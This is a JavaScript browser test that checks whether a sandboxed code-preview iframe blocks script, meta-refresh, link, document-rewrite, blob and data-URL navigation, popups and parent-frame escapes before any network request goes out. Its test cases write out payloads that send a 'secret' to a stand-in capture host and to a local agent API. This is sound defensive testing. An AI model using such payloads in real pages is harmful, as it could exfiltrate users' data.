import assert from 'node:assert/strict';
import { createJiti } from 'jiti';

const jiti = createJiti(import.meta.url);
const { interactivePreviewHostDocument } = await jiti.import('../lib/interactive-preview.ts');

async function mountPreview(page, code) {
  await page.setContent('<body></body>');
  await page.evaluate((source) => {
    const frame = document.createElement('iframe');
    frame.sandbox = 'allow-scripts';
    frame.srcdoc = source;
    document.body.append(frame);
  }, interactivePreviewHostDocument(code));
}

export async function checkPreviewNavigation(browser) {
  const context = await browser.newContext();
  try {
    const target = 'https://example.invalid/capture?secret=123';
    const cases = [
      ['location.href', `<script>location.href=${JSON.stringify(target)}</script>`],
      ['location.assign', `<script>location.assign(${JSON.stringify(target)})</script>`],
      ['location.replace', `<script>location.replace(${JSON.stringify(target)})</script>`],
      ['same-app navigation', '<script>location.href="http://127.0.0.1:30141/api/agent/running?secret=123"</script>'],
      ['meta refresh', `<meta http-equiv="refresh" content="0;url=${target}">`],
      ['dynamic meta refresh', `<script>const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=${target}';document.head.append(m)</script>`],
      ['link click', `<a id="leave" href="${target}">Leave</a>`],
      ['document rewrite', `<script>document.open();document.write('<meta http-equiv="refresh" content="0;url=${target}">');document.close()</script>`],
      ['blob navigation', `<script>location.href=URL.createObjectURL(new Blob(['<script>location.href=${JSON.stringify(target)}<\\/script>'],{type:'text/html'}))</script>`],
      ['data navigation', `<script>location.href='data:text/html,'+encodeURIComponent('<script>location.href=${JSON.stringify(target)}<\\/script>')</script>`],
    ];
    for (const [name, code] of cases) {
      const page = await context.newPage();
      const requests = [];
      // Even a regression must never send requests to an external service or the user's app.
      await page.route('**/*', (route) => { requests.push(route.request().url()); return route.abort(); });
      const blocked = page.waitForEvent('console', {
        predicate: (message) => message.text().includes('frame-src') && message.text().includes('Content Security Policy'),
        timeout: 5000,
      });
      await mountPreview(page, code);
      if (name === 'link click') await page.frameLocator('iframe').frameLocator('iframe').locator('#leave').click();
      await blocked;
      assert.deepEqual(requests, [], `${name} must be blocked before any network request`);
      await page.close();
    }

    const page = await context.newPage();
    page.setDefaultTimeout(5000);
    const requests = [];
    await page.route('**/*', (route) => { requests.push(route.request().url()); return route.abort(); });
    const code = '<button id="ok" onclick="this.textContent=\'clicked\'">OK</button>';
    await mountPreview(page, code);
    const content = page.frameLocator('iframe').frameLocator('iframe');
    await content.locator('#ok').click();
    assert.equal(await content.locator('#ok').textContent(), 'clicked');
    await content.locator('body').evaluate(() => { location.hash = 'local'; });
    assert.equal(await content.locator('#ok').textContent(), 'clicked');
    await content.locator('body').evaluate((body, target) => {
      try { parent.document.body.innerHTML = 'escape'; } catch { body.dataset.parentBlocked = 'true'; }
      try { parent.location.href = target; } catch {}
      try { top.location.href = target; } catch {}
      window.open(target);
      const nested = document.createElement('iframe'); nested.src = target; body.append(nested);
    }, target);
    assert.equal(await content.locator('body').getAttribute('data-parent-blocked'), 'true');
    assert.equal(await page.locator('iframe').count(), 1);
    assert.equal(context.pages().length, 1, 'Popup creation is blocked');
    assert.deepEqual(requests, [], 'Ancestor navigation and nested external frames are blocked');
    await page.close();
    console.log('PASS: script/link/meta/rewrite/blob/data navigation is blocked before requests; local controls and hash navigation work');
  } finally {
    await context.close();
  }
}
